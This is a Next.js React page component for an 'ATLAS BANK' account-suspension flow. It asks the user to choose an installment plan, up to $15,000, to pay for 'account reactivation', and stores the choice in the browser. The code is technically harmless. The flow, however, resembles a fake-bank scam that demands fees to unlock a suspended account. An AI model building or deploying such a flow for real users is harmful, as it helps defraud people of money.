"use client";

import { useState } from "react";
import { useRouter } from "next/navigation";

const INSTALLMENT_PERIOD_KEY = "atlasInstallmentPeriod";
const INSTALLMENT_PAYMENT_KEY = "atlasInstallmentPayment";

const installmentOptions = [
  { period: "Midweek", detail: "Per month", amount: 1875 },
  { period: "Weekend / Weekly", detail: "Per month", amount: 3750 },
  { period: "Two Weeks", detail: "Per month", amount: 7500 },
  { period: "Full Month", detail: "Full payment", amount: 15000 },
];

export default function InstallmentPage() {
  const router = useRouter();
  const [period, setPeriod] = useState("");
  const [payment, setPayment] = useState(0);
  const [message, setMessage] = useState("");

  const handleContinue = (event: React.FormEvent<HTMLFormElement>) => {
    event.preventDefault();
    if (!period || !payment) {
      setMessage("Select an installment plan to continue.");
      return;
    }

    window.localStorage.setItem(INSTALLMENT_PERIOD_KEY, period);
    window.localStorage.setItem(INSTALLMENT_PAYMENT_KEY, payment.toFixed(2));
    router.push("/suspension/continue");
  };

  return (
    <main className="auth-layout suspension-page">
      <section className="auth-card suspension-card installment-card" aria-labelledby="installment-title">
        <div className="auth-card-header">
          <strong className="auth-logo">ATLAS BANK</strong>
          <p className="eyebrow">Reactivation plan</p>
          <div className="suspension-review-mark" aria-hidden="true">1</div>
          <h1 id="installment-title">Installment period and payment</h1>
          <p>Choose the payment schedule you want to use before continuing with account reactivation.</p>
        </div>

        <form className="installment-form" onSubmit={handleContinue}>
          <div className="installment-options" role="radiogroup" aria-label="Installment plans">
            {installmentOptions.map((option) => (
              <label className={`installment-option ${period === option.period ? "selected" : ""}`} key={option.period}>
                <input type="radio" name="installment-plan" value={option.period} checked={period === option.period} onChange={() => { setPeriod(option.period); setPayment(option.amount); }} />
                <span className="installment-option-copy"><strong>{option.period}</strong><small>{option.detail}</small></span>
                <strong className="installment-option-price">${option.amount.toLocaleString("en-US", { minimumFractionDigits: 2 })}</strong>
              </label>
            ))}
          </div>

          {message ? <p className="settings-note" role="alert">{message}</p> : null}

          <div className="form-actions installment-actions">
            <button className="secondary-btn" type="button" onClick={() => router.back()}>Back</button>
            <button className="primary-btn" type="submit">Continue to generate account</button>
          </div>
        </form>
      </section>
    </main>
  );
}
